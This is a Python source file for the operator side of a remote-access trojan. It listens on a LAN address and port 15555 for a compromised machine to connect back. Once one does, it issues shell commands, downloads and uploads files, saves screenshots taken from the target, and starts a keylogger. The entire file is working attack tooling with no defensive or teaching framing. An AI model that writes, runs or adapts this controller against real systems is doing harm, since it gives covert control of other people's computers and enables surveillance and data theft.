#!/usr/bin/python
import socket
import json
import base64

count = 1

def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())


def reliable_recv():    
    json_data = ''
    while True:
        try :
            json_data = json_data + target.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue


def shell():
    global count
    while True:
        command = input('* Shell#~%s: ' % str(ip))
        reliable_send(command)

        if command == 'q':
            break
        elif command[:2] == 'cd' and len(command) > 1:
            continue
        elif command[:12] == "keylog_start":
            continue
        # elif command[:11] == 'keylog_dump':
        elif command[:8] == 'download':
            with open(command[9:], 'wb') as file:
                result = reliable_recv()
                file.write(base64.b64decode(result))
            continue
        elif command[:6] == 'upload':
            try:
                with open(command[7:], 'rb') as fin:
                    reliable_send(base64.b64encode(fin.read()).decode())
                continue
            except:
                failed = "Failed to Upload"
                reliable_send(base64.b64encode(failed.encode()))
                continue
        elif command[:10] == 'screenshot':
            image = reliable_recv()
            try:
                image_decoded = base64.b64decode(image)
                if image_decoded[:4] == b'[!!]':
                    print(image_decoded.decode())
                else:
                    with open("screenshot%d.jpg" % count, 'wb') as screen:
                        screen.write(image_decoded)
                    count += 1
            except Exception as e:
                print(f"[!!] Failed to decode image: {e}")
        else:
            result = reliable_recv()
            print(result)



def server():
    global s
    global ip
    global target

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP socket
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow address reuse
    s.bind(('192.168.1.119', 15555)) 
    s.listen(5)

    print("Listening for incoming connections")
    target, ip = s.accept() # Accept a connection from a client;
    print('Target connected!')

server()
shell()
s.close()
